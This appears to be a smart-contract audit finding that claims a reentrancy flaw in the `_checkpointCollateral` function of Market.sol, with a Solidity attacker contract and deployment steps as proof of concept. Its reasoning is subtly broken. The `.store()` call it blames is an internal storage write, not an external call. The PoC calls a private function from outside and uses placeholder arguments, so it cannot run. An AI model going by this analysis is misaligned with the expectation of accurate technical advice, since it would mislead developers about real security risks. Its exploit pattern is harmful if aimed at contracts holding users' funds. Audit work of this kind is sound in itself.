# Possible reentrancy attacks in `Market.sol` due to unprotected external `.store()` calls within the `_checkpointCollateral` function
## Summary

The Market.sol contract allows for the occurrence of a reentrancy attack, which is due to unprotected external calls to `_pendingPositions[account][context.local.latestId].store()`. In essence, the attack can happen when a contract dispatches Ether to an address before updating its internal state.

## Vulnerability Detail

The `_checkpointCollateral` function in Market.sol contract is found to make an external call without instituting adequate reentrancy protection measures. This external call is made to an arbitrary address and does not incorporate security best practices such as the Checks-Effects-Interactions pattern or a ReentrancyGuard. 

The `_checkpointCollateral` function computes certain operations on `latestAccountPosition` and then uses the `.store()` method on `_pendingPositions[account][context.local.latestId]` to store the result. If not properly secured, this `.store()` method could actually pave the way for a reentrancy attack if the address in the recipient account is a malicious contract that recursively calls into the `_checkpointCollateral` function before the initial call completes execution. This could enable an attacker to manipulate the contract state to their advantage or carry out other unintended actions.

## Code Snippet

```solidity
function _checkpointCollateral(
    Context memory context,
    address account,
    Fixed6 previousDelta,
    Position memory nextPosition
) private {
    Position memory latestAccountPosition = _pendingPositions[account][context.local.latestId].read();
    Position memory currentAccountPosition = _pendingPositions[account][context.local.currentId].read();
    latestAccountPosition.collateral = context.local.collateral
        .sub(currentAccountPosition.delta.sub(previousDelta))         
        .add(Fixed6Lib.from(nextPosition.fee))                        
        .add(Fixed6Lib.from(nextPosition.keeper));                    
    _pendingPositions[account][context.local.latestId].store(latestAccountPosition);
}
```

## Tool used

Manual Review

## Impact

Reentrancy attacks can lead to severe implications on smart contract security, as they may result in unexpected behaviors and risk of losing people's funds. In this particular instance, an attacker could manipulate the contract state to their advantage or execute other unintended actions.

## Recommendation

To mitigate the risk of reentrancy attacks, it is recommended to enforce a reentrancy guard on all functions that make external calls. The OpenZeppelin library offers a `ReentrancyGuard` contract that could be leveraged for this purpose. This contract offers a `nonReentrant` modifier that prevents a function from being invoked while it's already executing.

## Proof Of Concept

> Here's an example of a malicious contract that could be used to exploit this vulnerability:

```solidity
pragma solidity ^0.8.13;

import "./Market.sol";

contract MaliciousContract {
    Market market;
    address marketAddress;
    uint256 latestId;
    uint256 currentId;

    constructor(address _marketAddress, uint256 _latestId, uint256 _currentId) {
        marketAddress = _marketAddress;
        market = Market(_marketAddress);
        latestId = _latestId;
        currentId = _currentId;
    }

    fallback() external payable {
        market._checkpointCollateral(Context(...), address(this), Fixed6(...), Position(...));
    }

    function triggerReentrancy() public {
        market._checkpointCollateral(Context(...), address(this), Fixed6(...), Position(...));
    }
}
```

1. Deploy the `MaliciousContract` with the address of the `Market.sol` contract, `latestId`, and `currentId` as constructor parameters.
2. Call the `triggerReentrancy` function of the `MaliciousContract`.
3. The `MaliciousContract` will now call the `_checkpointCollateral` function of the `Market.sol` contract.
4. When the `.store()` method on `_pendingPositions[account][context.local.latestId]` is invoked, the fallback function of the `MaliciousContract` is triggered, resulting in a recursive call to `_checkpointCollateral`.
5. Observe how the state of the `Market.sol` contract is manipulated in an unintended way due to the recursive call.
